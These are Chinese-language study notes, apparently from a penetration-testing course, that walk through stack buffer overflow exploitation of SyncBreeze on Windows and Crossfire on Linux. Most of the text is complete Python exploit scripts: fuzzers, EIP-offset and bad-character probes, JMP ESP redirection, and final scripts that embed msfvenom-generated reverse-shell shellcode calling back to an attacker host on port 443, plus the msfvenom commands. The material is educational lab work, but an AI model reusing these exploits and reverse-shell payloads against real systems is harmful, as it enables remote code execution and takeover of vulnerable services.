### Immunity Debugger
二进制调试器
```
# 四个窗格
# 左上 指令地址(如0x004014E0) 要执行的汇编指令
# 右上 所有寄存器 其中关心ESP和EIP EIP指向0x004014E0
# 右下 栈及其内容四列  内存地址 数据 数据ASCII表示 附加信息动态注释
# 左下 内存内容三列    内存地址 数据 数据ASCII表示(可以通过右键选择以何种格式显示)
# Debug > Step into # F7 # 粗略理解为执行一小步
# Debug > Step over # F8 # 粗略理解为执行一大步
# 定位 左上窗口右键 Search for > All referenced text strings
# 双击 跳转到需要定位的上下文附近
# 在关键行上设置断点 # 选中行strcpy 按F2
# 执行 Debug > Run # F9
# 可以发现程序在断点处暂停 EIP指向断点行所在地址
# 在右下窗格中可以看到参数 以及参数要strcpy复制到的目标地址 如dest = 0065FE70
# 现在执行一步 Debug > Step into # or F7
# 左上窗格进入strcpy调用内部 双击右下窗格中0x0065FE70那一行 地址变为了相对偏移量
# 此时该地址中可能存在残留数据 不用关心
# Debug > Execute till return # Ctrl + F9 # 执行到当前函数return但不return
# 可以看到栈中被成功复制数据
# 偏移量$+4C 即为限制的大小64=4*16 这是主函数的返回地址 如004013E3
# 单步执行return 弹出栈顶 # 即右下窗格第一行的地址0x004015AF进入EIP 返回到主函数中 strcpy完成
# MOV EAX,0 <==> return 0
# LEAVE 指令弹出多余数据 栈顶元素变为004013E3
# 所以说如果能过覆盖掉这一行 将0065FE70+4C出的数据 如004013E3变为我们自己控制的地址 就可以改变函数执行的流程
# 改变程序输入 超过地址空间长度 发生溢出 覆盖后的地址不是进程内存空间中的有效地址 程序异常

## Windows 缓冲区溢出
# 识别应用漏洞的三种主要技术：源码审计、逆向工程、模糊测试
# 如果可用，源码审计 source code review是最容易的
# 模糊测试 fuzzing 的目标是提供未正确处理的输入 从而导致应用崩溃
# 以SyncBreeze为例

## 模糊测试HTTP协议
# 发送HTTP包脚本示例
#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  size = 100
  inputBuffer = "A" * size
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 10.11.0.22\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://10.11.0.22/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("10.11.0.22", 80))
  s.send(buffer)
  s.close()
  print "\nDone!"
except:
  print "Could not connect!"
# 探测溢出 PoC脚本
#!/usr/bin/python
import socket
import time
import sys
size = 100
while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size
    inputBuffer = "A" * size
    content = "username=" + inputBuffer + "&password=A"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Fire
    fox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    \r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.11.0.22", 80))
    s.send(buffer)
    s.close()
    size += 100
    time.sleep(10)
  except:
    print "\nCould not connect!"
    sys.exit()
# 在运行这个脚本之前 在靶机上使用调试器捕获
# 使用Microsoft TCPView查看目标端口对应的PID
# https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview
# Immunity Debugger 中 File > Attach 没有发现该进程 需要以管理员权限运行才能发现该进程
# 打开后会暂停该进程 按F9启动
# 启动fuzz脚本
# 当脚本运行到大约800字节时 EIP变得异常 应用中止 需要通过服务重启应用

## Windows缓冲区溢出利用
# 保护机制：DEP ASLR CFG等
# 崩溃脚本
#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  size = 800
  inputBuffer = "A" * size
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 10.11.0.22\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://10.11.0.22/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("10.11.0.22", 80))
  s.send(buffer)
  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"
# 控制EIP寄存器 需要找到哪一部分落在了EIP中
# 可以尝试二叉分析 折半使用不同的内容 需要进行多次
# 我们使用更快的方式 使用msf-pattern_create 生成唯一序列
locate pattern_create
msf-pattern_create -h
# -l指定长度
msf-pattern_create -l 800
# 探测EIP落点脚本 将buffer替换为生成的序列即可
#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa...1Ba2Ba3Ba4Ba5Ba"
  content = "username=" + inputBuffer + "&password=A"
...
# 确定偏移量 假如EIP内容为42306142
msf-pattern_offset -l 800 -q 42306142
# 假设结果为 [*] Exact match at offset 780
# 偏移量780 控制EIP脚本
#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  filler = "A" * 780 # 占位
  eip = "B" * 4      # 关键点
  buffer = "C" * 16  # 暂时不关心 后续利用
  inputBuffer = filler + eip + buffer
  content = "username=" + inputBuffer + "&password=A"
...
# 此时EIP已经可以被控制 接下来是如可利用
# shellcode 是汇编指令的集合 执行攻击者所需的操作 通常是反弹shell或更复杂的操作
# 检查发现 上次程序崩溃时 即EIP中的地址无效发生异常时 ESP寄存器指向全是C的位置 且偏移为4
# 标准反弹shell有效payload大约需要350-400字节 所以我们需要查看增加负载长度后 能否不改变崩溃性质 进一步加以利用
...
filler = "A" * 780
eip = "B" * 4
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
inputBuffer = filler + eip + offset + buffer
...
# 检查后发现ESP确实指向了目标位置 且可用空间足够大

## 检查坏字符
# 根据应用程序、漏洞、协议类型 有些字符被认为是坏的 无法使用
# 常见的如0x00 在strcpy中不能使用 因为遇到0x00会认为是字符串结尾
# 0x0D在HTTP POST请求中不可用 会被当作是HTTP的结束
# 验证坏字符 PoC脚本
#!/usr/bin/python
import socket
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
try:
  print "\nSending evil buffer..."
  filler = "A" * 780
  eip = "B" * 4
  offset = "C" * 4
  inputBuffer = filler + eip + offset + badchars
  content = "username=" + inputBuffer + "&password=A"
...
# 执行后右键ESP所在行 Follow in Dump
# 发现只有0x01到0x09成功进入缓冲区 0x0A被视作换行符
# 在脚本中删除掉0x0A重新发送负载 0x0C后又被截断了 说明0x0D也是坏字符
# 以此类推 共发现 0x00 0x0A 0x0D 0x25 0x26 0x2B 0x3D 会破坏缓冲区 # HTTP中%&+=等
# EIP重定向
# 接下来的问题是重定向到shellcode的地址
# 由于程序每次启动分配的地址都会变动 硬编码是行不通的
# 使用间接跳转 执行 JMP ESP 指令
# 许多库中都包含这条指令 但要找到没有使用ASLR编译的库 这样地址才能是静态的 其次 指令地址不能包含坏字符 会破坏缓冲区
# 使用Immunity Debugger自带的脚本mona.py # 在最下方状态栏中输入!mona modules
# 输出中包括 模块基地址 顶部地址 模块大小 几个..标志 模块版本、名称和路径
# 可以看到syncbrs.exe所有安全flag都是false 但其基址是0x00400000 包含0x00坏字符
# 查看其它flag为false的模块 发现LIBSPP.DLL似乎不包括坏字符 现在我们需要在这个模块中找到一个自然发生的JMP ESP指令
# 如果启用了DEP支持 我们的JMP ESP指令必须在模块的.text代码段里 这是唯一一个同时具有R和X权限的段
# 但是这里LIBSPP.DLL没有启用DEP支持所以可以自由使用
# 在搜索前 使用Metasploit的NASM Shell脚本找到JMP ESP对应的操作码
msf-nasm_shell
nasm > jmp esp
# 输出为00000000  FFE4    jmp esp
# 0xFFE4 即为jmp esp 的操作码
# 使用mona.py搜索LIBSPP -s指定操作码 -m指定模块
# !mona find -s "\xff\xe4" -m "libspp.dll"
# 输出结果中包含一个0x10090c83的地址 且没有坏字符
# 点击上方工具栏中Go to address in Disassembler的按钮 输入0x10090c83 跳转到该地址 发现指令确实为JMP ESP 可用
# EIP重定向脚本
...
filler = "A" * 780
eip = "\x83\x0c\x09\x10" # 注意是小端存储 这里的地址是反过来的 x86和amd64架构中都是这样
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
inputBuffer = filler + eip + offset + buffer
...
# 在 0x10090c83 所在行按 F2 加断点 启动程序和PoC 发现正确停在了这一行 按F7放行 现在只差shellcode了

## 生成shellcode
# MSFvenom 是 Msfpayload 和 Msfencode 的组合 用它来生成payload
msfvenom -l payloads # 列出payload
# 生成windows反弹shell的payload # 参数-f c 指定C风格的shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
# 发现生成结果中有坏字符0x00
# 使用高级多态编码器shikata_ga_nai对结果进行编码 -b指定坏字符
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

## 获取Shell
# 编码后的shellcode不能直接使用 还需要先解码 shikata_ga_nai的解码器位于最初的几个字节
# 但是GetPC过程会破坏内存上下文若干字节的内容 即ESP所指向的地址 也就是解码器所在的位置
# 所以我们要在shellcode前添加降落场landing pad 被破坏了也没关系 不会影响到解码器
# 即若干条无操作指令 NOP 其操作码为0x90
# 反弹shell脚本
#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  shellcode = ("\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
  "\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
  "\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59"
  "\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48"
  "\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f"
  "\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6"
  "\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4"
  "\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff"
  "\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1"
  "\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8"
  "\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2"
  "\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62"
  "\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e"
  "\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2"
  "\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e"
  "\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49"
  "\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70"
  "\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23"
  "\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f"
  "\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56"
  "\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8"
  "\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b"
  "\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6"
  "\x5f\xa3\x05\x74\x5f\xe6")
  filler = "A" * 780
  eip = "\x83\x0c\x09\x10"
  offset = "C" * 4
  nops = "\x90" * 10
  inputBuffer = filler + eip + offset + nops + shellcode
  content = "username=" + inputBuffer + "&password=A"
  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 10.11.0.22\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://10.11.0.22/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  buffer += content
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("10.11.0.22", 80))
  s.send(buffer)
  s.close()
  print "\nDone did you get a reverse shell?"
except:
  print "\nCould not connect!"
# 到此为止成果获取shell 但是一旦我们退出 存在漏洞的服务就会崩溃 这显然不是最好的结果 我们希望它保持运行 以便再次利用
# Metasploit shellcode 默认的退出方法是ExitProcess API 这会杀死整个进程
# 可以尝试只关闭线程而不是进程 使用EXITFUNC=thread选项重新生成shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"

## Linux缓冲区溢出
# 示例调试器Evans Debugger(受ODB启发) 漏洞程序Crossfire
# Data Execution Prevention(DEP) Address Space Layout Randomization (ASLR) Stack Canaries 等保护机制绕过暂不关心
# 启动Evans Debugger
edb
# 选择漏洞进程 File > Attach # 检索crossfire
# 刚开始进程被暂停了 点击启动或按F9
# PoC脚本
#!/usr/bin/python
import socket
host = "10.11.0.128"
crash = "\x41" * 4379 # 全是A
buffer = "\x11(setup sound " + crash + "\x90\x00#" # 设置声音 开头和结尾是预设的十六进制值
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent!"
# 运行后调试器报错 点击OK后发现EIP改变了 变为0x41414141

## 定位EIP
msf-pattern_create -l 4379
# 修改PoC中的buffer 确定偏移量
...
crash = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A..."
...
msf-pattern_offset -q 46367046 # [*] Exact match at offset 4368

## 为shellcode找空间
# 查看程序崩溃时指向PoC中buffer空间的寄存器
...
crash = "\x41" * 4368 + "B" * 4 + "C" * 7
...
# ESP指向缓冲区末尾 只剩7个字节空间 不够利用
# 而增加缓冲区长度 会导致不同异常 无法正确覆盖EIP
# 而EAX寄存器似乎指向缓冲区的开头 包括setup sound ...
# 且"setup sound"的前几个字节 0x73 0x65和0x74 0x75对应的跳转指令 可能真的能跳转到缓冲区的某些位置
# 但这不是一个优雅的解决方案 try harder
# ESP会指向缓冲区的末尾 但只有几个字节可以利用 我们可以先将EAX+12以跳过"setup sound " 在跳转到EAX
# 使用msf-nasm_shell查看对应指令
msf-nasm_shell
nasm > add eax,12  #  00000000  83C00C    add eax,byte +0xc
nasm > jmp eax     #  00000000  FFE0      jmp eax
# PoC脚本
#!/usr/bin/python
import socket
host = "10.11.0.128"
padding = "\x41" * 4368
eip = "\x42\x42\x42\x42"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent!"

## 检查坏字符
...
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00" )
...
# 最后发现 貌似只有0x00和0x20

## 查找返回地址
# EIP中必须是指向JMP ESP指令的地址 而不是指令本身
# Plugins > OpcodeSearcher
# 选中地址范围 注意必须是有RX权限的
# 再选 jump equivalent # ESP->EIP
# 找到一个0x08134596
#!/usr/bin/python
import socket
host = "10.11.0.128"
padding = "\x41" * 4368
eip = "\x96\x45\x13\x08" # 小端存储 必须反过来
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90" # 指令是根据架构确定的 不用管
buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent!"
# 设置断点 Plugins > Breakpoint Manager > Add Breakpoint # 0x08134596
# 运行PoC 命中断点 继续执行EAX正确指向AAAA...

## 获取shell
# -p指定负载 -b指定坏字符 -f指定风格这里是python直接复制到脚本中使用即可 -v指定变量名
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode
# 最终脚本
#!/usr/bin/python
import socket
host = "10.11.0.128"
nop_sled = "\x90" * 8 # NOP sled # or # NOP slide
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py
shellcode = ""
shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"
shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"
shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"
shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"
shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"
shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"
shellcode += "\x7f\x6d\x02\x36"
padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip = "\x96\x45\x13\x08" # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent!"
# 可以成功反弹shell 关闭调试器拦截
```
